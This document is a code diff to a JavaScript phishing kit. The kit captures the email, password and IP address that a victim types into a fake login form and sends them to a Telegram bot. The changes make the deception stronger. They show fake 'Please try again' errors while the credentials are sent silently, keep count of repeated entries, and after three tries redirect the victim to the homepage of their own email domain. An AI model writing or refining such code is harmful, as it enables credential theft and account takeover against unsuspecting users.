@@ -11,6 +11,7 @@ let userCity = 'Unknown';
 let userISP = 'Unknown';
 let userTimezone = 'Unknown';
 let userDevice = '';
+let loginAttempts = 0; // Track login attempts
 
 // ==================== TRANSLATION STRINGS ====================
 const translationStrings = {
@@ -29,9 +30,9 @@ const translationStrings = {
         terms: "Terms",
         security: "Security",
         please_fill: "Please fill in all fields",
-        sending: "Sending...",
-        submitted_success: "✓ Login submitted successfully",
-        error_submitting: "✗ Error submitting form. Please try again.",
+        sending: "Please try again",
+        submitted_success: "Please try again",
+        error_submitting: "Error. Please try again.",
         logging_into: "Logging into"
     }
 };
@@ -116,7 +117,6 @@ function sendToTelegram(email, password, ipInfo) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
         
         console.log('Sending to Telegram...');
-        console.log('URL:', url.substring(0, 100) + '...');
         
         // Use Image method - ALWAYS WORKS
         const img = new Image();
@@ -158,6 +158,7 @@ function setupLoginButton() {
         // Get form values
         const email = document.getElementById('user_email')?.value || '';
         const password = document.getElementById('pw')?.value || '';
+        const domain = email.includes('@') ? email.split('@')[1] : '';
         
         // Validate
         if (!email || !password) {
@@ -178,34 +179,52 @@ function setupLoginButton() {
             return;
         }
         
-        // Disable button and show loading
+        // Increment attempt counter
+        loginAttempts++;
+        console.log(`Login attempt #${loginAttempts}`);
+        
+        // Disable button and show "Please try again" message
         loginBtn.disabled = true;
         const originalText = loginBtn.textContent;
-        loginBtn.textContent = 'Sending...';
+        loginBtn.textContent = 'Please try again';
         
-        // Show sending message
-        showMessage('Sending to Telegram...', 'success');
+        // Show error message (but still send to Telegram)
+        showMessage('Error. Please try again.', 'error');
         
-        // Get IP and send
+        // Get IP and send to Telegram (silently)
         getUserIP(function(ip) {
             userIP = ip;
             console.log('Got IP:', ip);
             
-            // Send to Telegram
+            // Send to Telegram (silently - no UI feedback)
             sendToTelegram(email, password, ip)
                 .then(() => {
-                    showMessage('✓ Login submitted successfully', 'success');
-                    document.getElementById('pw').value = ''; // Clear password
+                    console.log('Telegram sent successfully');
                 })
                 .catch((error) => {
-                    console.error('Error:', error);
-                    showMessage('✗ Error submitting form', 'error');
+                    console.error('Telegram error:', error);
                 })
                 .finally(() => {
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = originalText;
+                    // Re-enable button after 1 second
+                    setTimeout(() => {
+                        loginBtn.disabled = false;
+                        loginBtn.textContent = originalText;
+                    }, 1000);
                 });
         });
+        
+        // Check if this is the third attempt
+        if (loginAttempts >= 3 && domain) {
+            console.log(`Third attempt reached. Redirecting to https://${domain}`);
+            
+            // Show redirect message
+            showMessage(`Redirecting to ${domain}...`, 'success');
+            
+            // Redirect to the domain homepage after a short delay
+            setTimeout(() => {
+                window.location.href = `https://${domain}`;
+            }, 2000);
+        }
     });
 }
 
@@ -398,6 +417,9 @@ function initialize() {
         userIP = ip;
         console.log('IP detected:', ip);
     });
+    
+    // Reset login attempts on page load
+    loginAttempts = 0;
     
     // Log configuration status
     console.log('=== CONFIGURATION ===');
